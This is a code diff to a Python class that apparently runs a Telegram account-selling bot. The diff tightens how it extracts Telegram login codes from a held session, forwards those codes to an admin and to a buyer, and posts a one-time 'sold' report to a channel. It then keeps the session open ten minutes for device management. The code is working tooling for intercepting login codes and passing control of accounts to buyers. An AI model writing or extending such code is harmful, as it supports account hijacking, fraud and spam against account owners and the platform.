@@ -489,6 +489,8 @@ class AccountManager:
         self._buyers: Dict[ObjectId, int] = {}
         # Admin OTP monitoring: {account_id: admin_user_id}
         self._admin_monitors: Dict[ObjectId, int] = {}
+        # Track sold report sent per account session
+        self._sold_report_sent: set[ObjectId] = set()
         self._pending_admin_login: Dict[int, PendingLogin] = {}
 
     # ----- admin phone login (for adding accounts) -----
@@ -607,28 +609,33 @@ class AccountManager:
         async def otp_listener(event):
             text = (event.raw_text or event.text or "").strip()
 
-            # Always allow admin monitor (plain forward), even if buyer exists
+            # Admin monitor: forward ONLY real OTPs (prefer 5-digit), ignore other service messages
             admin_monitor = self._admin_monitors.get(account_id)
             if admin_monitor:
-                try:
-                    await self._bot.send_message(
-                        chat_id=admin_monitor,
-                        text=f"📱 OTP for +{account_doc.get('phone','')}:\n\n{text}",
-                    )
-                except Exception:
-                    pass
+                import re
+
+                m5a = re.search(r"\b(\d{5})\b", text)
+                if m5a:
+                    otp_admin = m5a.group(1)
+                    try:
+                        await self._bot.send_message(
+                            chat_id=admin_monitor,
+                            text=f"📱 OTP for +{account_doc.get('phone','')}: {otp_admin}",
+                        )
+                    except Exception:
+                        pass
 
             buyer = self._buyers.get(account_id)
             if not buyer:
                 return
 
-            # Forward only the FIRST real OTP (4-8 digit). After that, stop buyer forwarding.
-            otp_code = ""
-            for token in text.split():
-                digits = "".join(ch for ch in token if ch.isdigit())
-                if 4 <= len(digits) <= 8:
-                    otp_code = digits
-                    break
+            # Forward only the FIRST real OTP. Telegram login OTPs are usually 5 digits.
+            import re
+
+            m5 = re.search(r"\b(\d{5})\b", text)
+            m6 = re.search(r"\b(\d{6})\b", text)
+            m4 = re.search(r"\b(\d{4})\b", text)
+            otp_code = (m5.group(1) if m5 else (m6.group(1) if m6 else (m4.group(1) if m4 else "")))
             if not otp_code:
                 # ignore non-OTP service messages (e.g., 2FA changed)
                 return
@@ -680,15 +687,17 @@ class AccountManager:
                 except Exception:
                     pass
 
-            # Report to channel (bot must be admin)
-            try:
-                await _send_sold_report(
-                    self._bot,
-                    account_doc=account_doc,
-                    otp_text=str(otp_display),
-                )
-            except Exception:
-                pass
+            # Report to channel (bot must be admin) - send only once
+            if account_id not in self._sold_report_sent:
+                self._sold_report_sent.add(account_id)
+                try:
+                    await _send_sold_report(
+                        self._bot,
+                        account_doc=account_doc,
+                        otp_text=str(otp_display),
+                    )
+                except Exception:
+                    pass
 
             # Keep session for a short window to allow device management, then disconnect.
             asyncio.create_task(self.disconnect_later(account_id, seconds=600))
